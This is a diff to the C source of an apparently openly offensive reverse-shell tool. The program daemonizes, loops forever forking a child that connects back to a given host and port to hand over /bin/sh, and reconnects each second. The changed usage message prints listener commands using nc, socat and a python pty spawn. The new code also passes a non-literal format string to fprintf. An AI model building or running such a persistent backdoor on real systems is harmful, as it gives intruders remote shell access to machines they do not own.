@@ -1,29 +1,32 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/socket.h>
+#include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
-#include <netinet/in.h>
-#include <stdio.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/socket.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <netinet/in.h>
 #include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netinet/in.h>
 #include <arpa/inet.h>
+
+#define LEN 0x400
 
 void usage();
 void reverse_shell(const char* host, unsigned short port);
 const char shell[] = "/bin/sh";
-const char message[] = "Successfully reversed!\n\tIf you want a readline function, please exit then run:\nrlwrap nc -lvvp <port>\n\tor:\nsocat readline,history=$HOME/.socat.hist exec:'nc -lvvp <port>'\n\tIf you want to use a bash, please run:\npython -c \"__import__('pty').spawn('/bin/bash')\"\n";
+const char message[] = "Successfully reversed!\nIf you want a readline function, please use nc in this way:\n\trlwrap nc -lvvp <port>\nor:\n\tsocat readline,history=/tmp/.socat exec:'nc -lvvp <port>'\n\nIf you want to use a bash, please run the command after reversed:\n\tpython -c \"import pty;pty.spawn('/bin/bash')\"\n";
+const char* prompt = message + 23;
+char g_bin[LEN];
 
 int main(int argc, char *argv[]) {
+    memset(g_bin, 0, LEN);
+    strncpy(g_bin, argv[0], LEN - 1);
+
     if(argc != 3) {
-        usage(argv[0]);
+        usage();
     }
+
     int ret = daemon(1, 1);
     if (ret < 0) {
         fprintf(stderr, "Cannot enter daemon mode!\n");
@@ -33,12 +36,10 @@ int main(int argc, char *argv[]) {
     unsigned short port = (unsigned short)strtol(argv[2], NULL, 10);
 
     while (1) {
-        // pid_t parent = getpid();
         pid_t pid = fork();
-
         if (pid < 0) {
             fprintf(stderr, "Cannot fork!\n");
-            exit(pid);
+            exit(EXIT_FAILURE);
         } else if (pid > 0) {
             // parent process
             int status;
@@ -46,7 +47,7 @@ int main(int argc, char *argv[]) {
         } else {
             // child process
             reverse_shell(host, port);
-            _exit(EXIT_FAILURE);   // exec never returns
+            exit(EXIT_FAILURE);   // exec never returns
         }
         sleep(1);
     }
@@ -80,7 +81,8 @@ void reverse_shell(const char* host, unsigned short port) {
     close(sock);
 }
 
-void usage(const char* prog) {
-    fprintf(stdout, "Usage: %s <reverse host> <port>\n", prog);
+void usage() {
+    fprintf(stdout, "Usage: %s <reverse_host> <port>\n\n", g_bin);
+    fprintf(stdout, prompt);
     exit(-1);
 }
